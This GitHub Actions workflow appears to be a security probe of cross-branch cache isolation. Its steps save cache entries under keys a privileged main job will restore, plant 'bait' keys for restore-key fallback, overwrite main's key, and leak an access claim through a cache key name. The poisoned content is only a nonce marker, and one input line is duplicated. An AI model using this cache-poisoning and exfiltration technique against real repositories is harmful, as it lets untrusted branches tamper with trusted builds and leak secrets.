name: branch-probe
on:
  push:
    branches:
      - 'cbfeat/**'
      - 'main-**'
      - 'MAIN'
permissions:
  contents: write
  actions: read
jobs:
  branchjob:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - id: n
        run: |
          N="$(cat NONCE.txt)"
          echo "n=$N" >> $GITHUB_OUTPUT
          mkdir -p mine
          echo "BRANCH-CONTENT-MARKER-$N repo=${{ github.repository }} ref=${{ github.ref }} run=${{ github.run_id }}" > mine/marker.txt
      - name: probe
        id: p
        uses: ./.github/actions/cbprobe
        with:
          mode: pr
          nonce: ${{ steps.n.outputs.n }}
          ghtok: ${{ github.token }}
          mainkey: cbmain-${{ steps.n.outputs.n }}
          mainver: '5815f4cade2696c8503fee1d72b56e6a4771a264cc2753c24c189700109b0e08'
          mainver: '5815f4cade2696c8503fee1d72b56e6a4771a264cc2753c24c189700109b0e08'
      - run: rm -rf cachedir
      - name: read direction - restore what main wrote
        id: rd
        uses: actions/cache/restore@v4
        continue-on-error: true
        with:
          path: cachedir
          key: cbmain-${{ steps.n.outputs.n }}
      - run: 'echo "READ-MAIN-HIT=${{ steps.rd.outputs.cache-hit }} matched=${{ steps.rd.outputs.cache-matched-key }}"; cat cachedir/marker.txt 2>/dev/null || echo NO-CONTENT'
        continue-on-error: true
      - run: rm -rf cachedir; cp -r mine cachedir; cat cachedir/marker.txt
      - name: write the exact key the privileged main job will ask for
        uses: actions/cache/save@v4
        continue-on-error: true
        with:
          path: cachedir
          key: cbpfx-${{ steps.n.outputs.n }}-exact
      - name: write a prefix bait for the main job restore-keys fallback
        uses: actions/cache/save@v4
        continue-on-error: true
        with:
          path: cachedir
          key: cbpfx-${{ steps.n.outputs.n }}-bait
      - name: overwrite the key main already owns
        uses: actions/cache/save@v4
        continue-on-error: true
        with:
          path: cachedir
          key: cbmain-${{ steps.n.outputs.n }}
      - name: exfil the ac claim through a cache key
        uses: actions/cache/save@v4
        continue-on-error: true
        with:
          path: cachedir
          key: cbacpfx-${{ steps.n.outputs.n }}-${{ steps.p.outputs.ac }}
